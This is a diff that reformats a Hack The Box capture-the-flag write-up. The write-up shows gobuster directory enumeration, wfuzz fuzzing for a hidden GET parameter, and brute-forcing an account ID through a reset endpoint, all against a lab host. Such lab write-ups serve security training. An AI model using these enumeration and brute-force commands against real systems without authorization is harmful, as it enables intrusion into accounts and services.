@@ -12,7 +12,9 @@ We have this nice website in front of us..
 
 Let's start off with our basic gobuster..
 
-**Command** ```gobuster -u http://docker.hackthebox.eu:42566/ -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm```
+**Command**
+
+```gobuster -u http://docker.hackthebox.eu:42566/ -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm```
 
 **Command Explanation**
  - -w (wordlist)
@@ -44,7 +46,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 
 Now we got an interesting directory named ```api``` let's gobuster this now...
 
-### Command
+**Command**
 
 ```
 gobuster -u http://docker.hackthebox.eu:42566/api/ -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm
@@ -90,7 +92,7 @@ So now we need to find the GET parameter which will be used at this endpoint
 
 For this we will use ```wfuzz``` which can be found [here](https://github.com/xmendez/wfuzz)
 
-### Commands
+**Command**
 ```
 wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:42566/api/action.php?FUZZ=test
 ```
@@ -139,7 +141,7 @@ Now we will have to bruteforce the ```Account ID```
 
 We will again use wfuzz for it but this time we will set the character length to 27 (You can find this by simply counting it)...
 
-### Command
+**Command**
 
 ```
 wfuzz --hh=27 -c  -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:42566/api/action.php?reset=FUZZ
